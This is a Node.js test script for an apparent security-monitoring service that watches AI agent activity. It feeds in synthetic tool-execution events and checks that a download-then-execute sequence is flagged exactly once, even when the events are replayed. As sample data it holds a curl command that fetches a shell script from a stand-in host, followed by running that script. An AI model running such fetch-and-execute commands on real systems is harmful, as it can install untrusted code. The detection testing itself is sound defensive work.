#!/usr/bin/env node

import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';

const baseUrl = (process.env.ANYSENTRY_API_BASE
  ?? 'http://127.0.0.1:29653/security-center').replace(/\/$/, '');
const runId = `flink-${Date.now()}-${randomUUID().slice(0, 8)}-ambiguous`;
const positiveAgent = `${runId}-positive`;
const negativeAgent = `${runId}-negative`;
const workspacePath = `/tmp/${runId}-workspace`;
const target = `${workspacePath}/payload.sh`;

async function request(path, body, method = body === undefined ? 'GET' : 'POST') {
  const response = await fetch(`${baseUrl}${path}`, {
    method,
    headers: { 'content-type': 'application/json' },
    ...(body === undefined ? {} : { body: JSON.stringify(body) }),
  });
  const text = await response.text();
  const payload = text ? JSON.parse(text) : undefined;
  if (!response.ok) throw new Error(`${path} returned ${response.status}: ${text}`);
  return payload?.data ?? payload;
}

async function source(agent) {
  const result = await request('/sources', {
    name: `${agent} verifier`,
    type: 'observer',
    enabled: true,
    requireToken: false,
    collectorId: `${agent}-collector`,
    workspacePath,
    owner: 'verify-temporal-ambiguous-runtime',
    tags: ['temporal-ambiguous', runId],
  });
  return result.source.sourceId;
}

async function ingest(sourceId, agent, suffix, pid, argv) {
  const result = await request('/ingest', {
    line: JSON.stringify({
      identity: { agent, session: `${agent}-session`, task: `${agent}-task` },
      process: {
        uid: 1000,
        comm: argv[0],
        exe: argv[0],
        cwd: workspacePath,
        hostId: `${runId}-node`,
        bootId: `${runId}-boot`,
        pid,
        ppid: 90_000,
        startTimeNs: String(1_785_300_000_000_000_000n + BigInt(pid)),
      },
      event: {
        ToolExec: {
          pid,
          ppid: 90_000,
          uid: 1000,
          cwd: workspacePath,
          argv,
          exec_confirmed: true,
        },
      },
    }),
    sourceEventId: `${agent}-${suffix}`,
    sourceId,
    collectorId: `${agent}-collector`,
    nodeName: `${runId}-node`,
    sourceType: 'observer',
    workspacePath,
    attribution: {
      monitored: true,
      agentScopeId: agent,
      agentDisplayName: agent,
      agentSessionId: `${agent}-session`,
      rootPid: 90_000,
      confidence: 0.99,
      reason: 'authoritative_anchor',
      source: 'self_register',
    },
  });
  assert.equal(result.accepted, true);
}

const positiveSource = await source(positiveAgent);
await ingest(positiveSource, positiveAgent, 'download', 90_001, [
  'curl', '-fsS', '-o', target, 'https://example.com/payload.sh',
]);
await ingest(positiveSource, positiveAgent, 'execute', 90_002, [target]);
// Stable source IDs are deliberately replayed. They must not create a second
// Candidate, Episode, or model job.
await ingest(positiveSource, positiveAgent, 'download', 90_001, [
  'curl', '-fsS', '-o', target, 'https://example.com/payload.sh',
]);
await ingest(positiveSource, positiveAgent, 'execute', 90_002, [target]);

const negativeSource = await source(negativeAgent);
await ingest(negativeSource, negativeAgent, 'download-only', 91_001, [
  'curl', '-fsS', '-o', `${workspacePath}/negative.sh`, 'https://example.com/negative.sh',
]);

const deadline = Date.now() + Number(process.env.ANYSENTRY_STREAM_VERIFY_TIMEOUT_MS ?? 150_000);
let judgments = [];
while (Date.now() < deadline) {
  const findings = await request('/stream/findings', { timeType: 'last_3h', limit: 300 });
  judgments = findings.compositeJudgments?.filter((item) =>
    item.agentType === positiveAgent
    && item.ruleVersion === 'temporal-episode-v1') ?? [];
  if (judgments.some((item) => item.status === 'succeeded')) {
    const negative = findings.compositeJudgments?.find((item) =>
      item.agentType === negativeAgent
      && item.ruleVersion === 'temporal-episode-v1');
    assert.equal(negative, undefined, 'one fact must not form an ambiguous Episode');
    break;
  }
  await new Promise((resolvePromise) => setTimeout(resolvePromise, 500));
}

assert.equal(judgments.length, 1, 'replays must produce exactly one ambiguous Episode');
const judgment = judgments[0];
assert.equal(judgment.status, 'succeeded');
assert.equal(judgment.decisionSource, 'composite_judge');
assert.deepEqual(judgment.evidence.map((item) => item.operation), ['download', 'execute']);
console.log(JSON.stringify({
  runId,
  episodeId: judgment.episodeId,
  decisionSource: judgment.decisionSource,
  classification: judgment.classification,
  model: judgment.model,
  evidenceEventIds: judgment.evidenceEventIds,
}, null, 2));
console.log('Ambiguous Temporal one-shot Composite Judge verification passed');
